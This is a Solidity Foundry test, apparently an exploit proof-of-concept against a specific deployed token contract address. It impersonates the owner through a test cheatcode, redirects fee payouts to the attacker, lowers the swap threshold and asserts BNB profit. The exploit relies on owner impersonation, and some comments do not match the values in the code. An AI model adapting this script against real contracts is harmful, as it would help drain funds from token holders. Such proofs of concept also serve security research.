interface MyShibaAcademia {
    function owner() external view returns (address);
    function setMarketingAddress(address _marketingAddress) external;
    function setSwapAndLiquifyEnabled(bool _enabled) external;
    function setBuyBackEnabled(bool _enabled) external;
    function changePercentage(uint256 _liquidityPercent, uint256 _buybackPercent, uint256 _marketingPercent) external;
    function setNumTokensSellToAddToLiquidity(uint256 _minimumTokensBeforeSwap) external;
    function setBuybackUpperLimit(uint256 buyBackLimit) external;
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function uniswapV2Pair() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x93a20a5f1709659005e1610D1a022d5f1e2D0DF7;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // Get owner address - we need to find it first
        address owner = MyShibaAcademia(TARGET).owner();
        vm.label(owner, "Contract Owner");

        // Give attacker some initial tokens to work with
        deal(TARGET, attacker, 100_000 * 10**9);

        // Give attacker some ETH for gas
        deal(attacker, 10 ether);
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Get owner address
        address owner = MyShibaAcademia(TARGET).owner();

        // Step 2: Impersonate owner to change critical parameters
        vm.startPrank(owner);

        // Change marketing address to attacker
        MyShibaAcademia(TARGET).setMarketingAddress(attacker);

        // Enable swap features
        MyShibaAcademia(TARGET).setSwapAndLiquifyEnabled(true);
        MyShibaAcademia(TARGET).setBuyBackEnabled(true);

        // Adjust percentages to maximize marketing share (liquidityPercent=0, buybackPercent=0, marketingPercent=12)
        MyShibaAcademia(TARGET).changePercentage(0, 0, 12);

        // Set low minimum tokens before swap to trigger easily
        MyShibaAcademia(TARGET).setNumTokensSellToAddToLiquidity(1); // 1 token minimum

        // Set high buyback upper limit
        MyShibaAcademia(TARGET).setBuybackUpperLimit(1000); // 1000 BNB limit

        vm.stopPrank();

        // Step 3: Build up contract token balance
        // First, approve contract to spend attacker's tokens
        MyShibaAcademia(TARGET).approve(TARGET, type(uint256).max);

        // Transfer tokens to contract address to build up its balance
        // Need to transfer enough to exceed minimumTokensBeforeSwap (now set to 1 token)
        uint256 contractBalanceBefore = MyShibaAcademia(TARGET).balanceOf(TARGET);

        // Transfer tokens to contract (using transfer to address(this) in contract)
        // We'll transfer a significant amount
        uint256 amountToTransfer = 1_000_000 * 10**9; // 1M tokens
        MyShibaAcademia(TARGET).transfer(TARGET, amountToTransfer);

        // Step 4: Trigger swap mechanism
        // The swap is triggered when: !inSwapAndLiquify && swapAndLiquifyEnabled && from != uniswapV2Pair
        // We need to make a transfer where from != uniswapV2Pair
        // We'll transfer from attacker to another address (not the pair)
        address dummy = address(0x123);

        // Get pair address
        address pair = MyShibaAcademia(TARGET).uniswapV2Pair();

        // Make sure we're not transferring to/from pair
        // Transfer a small amount to trigger the swap check
        MyShibaAcademia(TARGET).transfer(dummy, 1 * 10**9);

        // Step 5: Collect BNB - marketing address (now attacker) should receive BNB
        // The contract should have swapped tokens and sent BNB to marketing address
        uint256 attackerBalanceAfter = address(attacker).balance;

        // Verify we received BNB
        assertGt(attackerBalanceAfter, 0, "Attacker should have received BNB");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

